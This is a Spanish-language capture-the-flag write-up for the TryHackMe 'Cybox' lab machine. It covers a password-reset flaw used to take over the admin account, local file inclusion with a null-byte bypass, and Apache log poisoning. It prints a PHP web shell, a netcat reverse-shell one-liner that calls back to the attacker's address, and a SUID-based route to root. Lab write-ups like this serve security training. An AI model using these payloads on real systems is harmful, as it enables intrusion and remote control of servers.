---
title: Tryhackme - Cybox (CTF UPSA 2020)
author: nik0
date: 2020-12-6 2:57:00 +0800
categories: [Write up]
tags: [THM,Cybox]
---
![CYBEX](/assets/img/sample/cybox/CYBEX.png)

## Introducción

En ese write up, veremos la máquina creada por [@takito1812](https://twitter.com/takito1812?s=20) Sirve para Virtual box y VMware, yo lo hice en VMware y usé tryhackme para poder conectarme a la máquina, aquí les dejo el código de la room: ```1337ctfupsa2020cybox``` muy entretenida máquina, la verdad me tuvo un rato peleando con los dominios que habían etc, pero eso lo aclaramos más adelante ;)


## Datos importantes

Para este CTF es muy importante tener en cuenta el email del administrador y el dominio de la página, se pueden encontrar en el footer de la página.

Email: admin@cybox.company
Dominio: cybox.company

## Añadir dominio a /etc/hosts

Primero necesitamos añadir a /etc/hosts la ip y el dominio del sitio

Ej: <ipMáquinaCybox> <dominio>
  
## Enumerando subdominios con gobuster

con el comando ```gobuster vhost -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --url http://cybox.company/```

Encontramos los siguientes subdominios: 

![1](/assets/img/sample/cybox/1.png)

los subdominios encontrados los añadimos al /etc/hosts para luego poder ingresar a cada uno de ellos y poder interactuar con ellos

esto se ve en: ftp.cybox.company
![2](/assets/img/sample/cybox/2.png)

esto se ve en: monitor.cybox.company
![3](/assets/img/sample/cybox/3.png)

esto se ve en: dev.cybox.company
![4](/assets/img/sample/cybox/4.png)

esto se ve en: register.cybox.company
![6](/assets/img/sample/cybox/6.png)

esto se ve en: webmail.cybox.company
![5](/assets/img/sample/cybox/5.png)

## Encontrando la vulnerabilidad

Primero nos metemos a los subdominios y vemos que en register.cybox.company hay un sistema para crear usuarios, en este caso me creo un usuario llamado "nadie"
y luego que le damos a create, nos da un correo nadie@cybox.company y unas credenciales "nadie:nadie"

![7](/assets/img/sample/cybox/7.png)

Ahora nos vamos a monitor.cybox.company y vemos un panel donde hay un login, procedemos a registrarnos con el correo que anteriormente obtuvimos, una vez registrados le damos click a "forgot password" e ingresamos nuestro correo, en este caso sería "nadie@cybox.company"

![9](/assets/img/sample/cybox/9.png)

Luego nos llegará al correo un mensaje para poder cambiar la contraseña, para esto vamos a webmail@cybox.company, nos logueamos con las credenciales que nos dieron en register.cybox.company

![10](/assets/img/sample/cybox/10.png)

Luego clickeamos el link:
![11](/assets/img/sample/cybox/11.png)

Vemos que se puede cambiar la contraseña, aunque si nos fijamos en la URL ```http://monitor.cybox.company/updatePasswordRequest.php?email=nadie@cybox.company``` en la parte del usuario "nadie" la podemos cambiar por el email del admin para ingresar una nueva contraseña, esto es un fallo de programación, entonces la URL quedaría así ```http://monitor.cybox.company/updatePasswordRequest.php?email=admin@cybox.company```

Ahora tenemos que cambiar la contraseña del admin, a cualquiera que nosotros queramos

Luego volvemos al panel y nos logueamos cómo admin:

![13](/assets/img/sample/cybox/13.png)

Si todo salió bien, deberíamos haber ingresado cómo Admin:

![14](/assets/img/sample/cybox/14.png)

Ingresamos al admin panel y nos sale esto:

![15](/assets/img/sample/cybox/15.png)

Vemos el código fuente:

![16](/assets/img/sample/cybox/16.png)

Observamos un link ```styles.php?style=general``` clickeamos y nos sale esto:

![17](/assets/img/sample/cybox/17.png)

Podemos inferir que esto es una vulnerabilidad LFI, ya que la página carga archivos del sitio

## LFI a RCE

Ya sabemos que puede ser una vulnerabilidad LFI, lo comprobamos añadiendo "../" a la URL y al final un directorio del sistema Linux en este caso "/etc/passwd", entonces la URL quedaría así:

```view-source:http://monitor.cybox.company/admin/styles.php?style=../../../../../../../../etc/paswd```

Si no nos muestra nada, es por que la extensión del archivo es .css, para poder bypassear esto, podemos usar un nullbyte "%00"

```view-source:http://monitor.cybox.company/admin/styles.php?style=../../../../../../../../etc/paswd%00```

Y si todo sale bien, se debería ver así: 

![18](/assets/img/sample/cybox/18.png)

Ahora confirmamos que es un LFI, tenemos que plantar una shell en el sitio, para ello revisamos información en el subdominio "dev.cybox.company" y vemos la info del apache, si nos fijamos bien, en "extension_dir" sale una ruta que utiliza Bitnami, si buscamos en google la [Documentación](https://docs.bitnami.com/aws/apps/elk/troubleshooting/debug-errors-apache/) nos sale donde se almacenan los logs de apache, en este caso se almacenan en "opt/bitnami/apache2/logs/access_log".

IMPORTANTE: para poder ingresar a los logs, debemos primero ingresar a la página donde se aloja el ftp, en este caso sería "ftp.cybox.company"

Ahora ingresamos a los logs, con la URL ```view-source:http://monitor.cybox.company/admin/styles.php?style=../../../../../../../opt/bitnami/apache2/logs/access_log%00```

![19](/assets/img/sample/cybox/19.png)

## Webshell

Una Webshell nos permite ejecutar comandos a nivel sistema ;)

Ahora tenemos que inyectar código php en los logs que se almacenan en el ftp, para ello abrimos Burpsuite y editamos el user-agent en la página del ftp

![20](/assets/img/sample/cybox/20.png)

Código a inyectar: <?php system($_GET['c']); ?>

Y le damos forward

Si todo salió bien, podríamos ejecutar comandos a nivel sistema, cómo se ve en la imagen:

![21](/assets/img/sample/cybox/21.png)

así sería la sintáxis para poder ejecutar comandos en el sistema, URL: view-source:http://monitor.cybox.company/admin/styles.php?style=../../../../../../../opt/bitnami/apache2/logs/access_log%00?&c=ls -la

## Reverse Shell 

Ahora que tenemos nuestra Webshell, podemos ejecutar comandos a nivel sistema, es momento de plantar una reverse shell, más abajo les dejo una, pero para que funcione primero debemos codificarla para que sea admitida por la URL, para ellos utilizaremos Burpsuite

Reverse Shell: rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.x.x 443 >/tmp/f

IMPORTANTE: recuerden cambiar la ip de la reverse shell por la de tun0 ;)

Ahora cómo se ve en la imagen, codificamos nuestra rev shell en encoder:

![22](/assets/img/sample/cybox/22.png)

Lo de abajo es nuestra reverse shell, CTRL + A para copiar todo

No ejecutarla aún!!!

Tenemos que poner netcat a la escucha, con el comando ```nc -lvnp 443```

![23](/assets/img/sample/cybox/23.png)

Y ahora si ejecutamos nuestra reverse shell, sí nos queda así cómo "cargando" es normal

Ahora nos vamos a netcat y vemos que tenemos nuestra conexión reversa:

![25](/assets/img/sample/cybox/25.png)

Podemos hacer nuestra shell full TTY para que sea más fácil moverse por la terminal

## Escalando Privilegios

Una vez dentro, podemos probar a buscar binarios SUID, con el comando ```find / -perm -u=s -type f 2>/dev/null```

![26](/assets/img/sample/cybox/26.png)

El directorio /opt/ se ve interesante

Ingresamos y vemos que hay un ejecutable para crear usuarios

Entonces este script lo que hace es crear un usuario y añadirlo al grupo con el mismo nombre, si nosotros nos creamos un usuario sudo, nos va a añadir al grupo sudo y ahí explotaríamos el fallo obteniendo la flag de root

![27](/assets/img/sample/cybox/27.png)

Hacemos un sudo -i y hacemos un cat para ver la flag ;)

![27](/assets/img/sample/cybox/28.png)

y también si queremos sacar el user, lo podemos hacer con un "find / | grep "user.txt"

![29](/assets/img/sample/cybox/29.png)













